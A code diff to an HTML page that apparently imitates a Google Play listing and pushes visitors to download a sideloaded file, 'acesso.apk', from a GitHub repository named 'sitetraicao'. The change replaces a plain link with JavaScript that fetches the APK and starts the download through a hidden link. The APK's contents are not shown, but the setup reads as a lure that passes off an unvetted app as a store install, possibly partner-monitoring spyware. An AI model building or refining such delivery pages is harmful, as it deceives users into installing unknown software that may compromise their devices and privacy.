@@ -194,6 +194,19 @@
             background-color: var(--play-green-hover);
         }
 
+        .install-btn:disabled {
+            opacity: 0.7;
+            cursor: wait;
+        }
+
+        .download-status {
+            min-height: 20px;
+            margin-top: 10px;
+            font-size: 13px;
+            text-align: center;
+            color: var(--text-secondary);
+        }
+
         .screenshots-scroll {
             display: flex;
             overflow-x: auto;
@@ -418,13 +431,11 @@
         </div>
 
         <div class="action-container">
-            <a
-                href="https://github.com/mrelliotaldersonfuck/sitetraicao/raw/refs/heads/main/acesso.apk"
-                download="acesso.apk"
-                class="install-btn"
-            >
+            <button type="button" class="install-btn" id="downloadButton">
                 Instalar
-            </a>
+            </button>
+
+            <p class="download-status" id="downloadStatus" aria-live="polite"></p>
         </div>
 
         <div class="screenshots-scroll">
@@ -538,5 +549,50 @@
             </div>
         </div>
     </div>
+
+    <script>
+        const apkUrl = 'https://raw.githubusercontent.com/mrelliotaldersonfuck/sitetraicao/main/acesso.apk';
+
+        const downloadButton = document.getElementById('downloadButton');
+        const downloadStatus = document.getElementById('downloadStatus');
+
+        downloadButton.addEventListener('click', async () => {
+            const originalText = downloadButton.textContent;
+
+            try {
+                downloadButton.disabled = true;
+                downloadButton.textContent = 'Preparando download...';
+                downloadStatus.textContent = 'Aguarde enquanto o APK é preparado.';
+
+                const response = await fetch(apkUrl);
+
+                if (!response.ok) {
+                    throw new Error('Arquivo não encontrado.');
+                }
+
+                const apkBlob = await response.blob();
+                const fileUrl = URL.createObjectURL(apkBlob);
+
+                const temporaryLink = document.createElement('a');
+                temporaryLink.href = fileUrl;
+                temporaryLink.download = 'acesso.apk';
+                temporaryLink.style.display = 'none';
+
+                document.body.appendChild(temporaryLink);
+                temporaryLink.click();
+                temporaryLink.remove();
+
+                URL.revokeObjectURL(fileUrl);
+
+                downloadStatus.textContent = 'Download iniciado.';
+            } catch (error) {
+                downloadStatus.textContent =
+                    'Não foi possível baixar o APK. Verifique se o arquivo está público no GitHub.';
+            } finally {
+                downloadButton.disabled = false;
+                downloadButton.textContent = originalText;
+            }
+        });
+    </script>
 </body>
 </html>
